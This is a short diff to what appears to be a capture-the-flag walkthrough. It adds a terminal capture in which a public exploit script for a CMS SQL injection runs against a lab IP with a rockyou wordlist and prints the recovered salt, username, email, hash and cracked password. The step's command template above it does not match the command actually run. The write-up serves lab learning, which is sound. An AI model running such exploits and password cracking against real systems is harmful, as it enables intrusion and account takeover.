@@ -175,6 +175,15 @@ UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 923: invali
 
 17. `python3 -u http://{TARGET IP}/simple --crack -u {WORDLIST PATH}`
 ```bash
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 46635.py -u http://10.10.130.66/simple --crack -w rockyou.txt
+
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[*] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+[*] Password cracked: secret
+```
 
 #
 > Step
